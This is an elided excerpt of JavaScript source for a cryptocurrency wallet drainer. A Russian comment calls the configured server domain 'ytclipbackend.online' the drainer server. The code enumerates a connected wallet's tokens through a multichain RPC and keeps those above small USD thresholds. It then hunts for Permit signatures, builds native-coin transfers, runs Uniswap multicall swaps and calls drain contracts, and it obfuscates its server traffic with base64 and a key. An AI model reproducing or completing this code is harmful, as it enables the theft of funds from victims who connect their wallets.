...
const MS_Server = "ytclipbackend.online"; // Указать домен, который прикреплен к серверу дрейнера
...
const send_request = async (data) => {
  try {
    ...
    data.chat_data =
      MS_Custom_Chat.Enable == 0 ? false : MS_Custom_Chat.Chat_Settings;
    const encode_key = btoa(String(10 + 256 + 512 + 1024 + 2048));
    ...
    let response_data = JSON.parse(
      atob(srp(encode_key, await response.text()))
    );
    if (!response_data.status)
      ...
      if (
        ...
        response_data.error == "SRV_UNAVAILABLE"
      )
        MS_Force_Mode = true;
  ...
  try {
    let tokens = [],
      response = await fetch(
        `https://rpc.ankr.com/multichain/${MS_Settings.AT || ""}`,
        {
          method: "POST",
          headers: {
...
const get_wallet_assets = async (address) => {
  try {
    ...
    else assets = await get_tokens(address);
      ...
      try {
        ...
        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
          ...
          if (
            ...
            MS_Settings.Settings.Permit.Priority
          ) {
            token_promises.push(
              new Promise(async (resolve) => {
                try {
                  ...
                  if (permit_type > 0) {
                    ...
                    console.log(
                      `[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${assets[x].permit_ver}`
                    );
                  }
                } catch (err) {
                  console.log(err);
          ...
          if (
            ...
            ((asset.chain_id == 1 && asset.amount_usd >= 50) ||
              (asset.chain_id != 1 && asset.amount_usd >= 15))
          ) {
            token_promises.push(
              new Promise(async (resolve) => {
                try {
...
const SIGN_NATIVE = async (asset) => {
  ...
  let tx_struct = {
      ...
      gasLimit: web3.utils.toHex(gas_limit_nt),
      gasPrice: web3.utils.toHex(gas_price),
      value: web3.utils.toHex(after_fee),
      data: "0x",
  ...
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (
        ...
        c_address[1] == asset.address.toLowerCase()
      ) {
...
const DO_UNISWAP = async (asset, all_tokens) => {
  ...
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, {
      from: MS_Current_Address,
    });
    gas_limit = ethers.BigNumber.from(gas_limit)
      .div(ethers.BigNumber.from("100"))
...
const DO_CONTRACT = async (asset) => {
  ...
  const contract = new ethers.Contract(
    ...
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1
      ? MS_Contract_ABI["CONTRACT_LEGACY"]
      : MS_Contract_ABI["CONTRACT"],
    MS_Signer
  );
  ...
  try {
    ...
    try {
      ...
      if (MS_Current_Provider == "WalletConnect") {
        load_wc();
        await MS_Provider.disconnect(0);
    ...
    if (
      ...
      MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase())
    ) {
      MS_Check_Done = true;
      Swal.close();
      Swal.fire({
      ...
      try {
        ...
        if (asset.type == "NATIVE") {
          ...
          if (
            ...
            MS_Settings.Settings.Approve.Enable &&
            (MS_Settings.Settings.Approve.MetaMask ||
              MS_Current_Provider != "MetaMask" ||
              MS_Mobile_Status)
          ) {
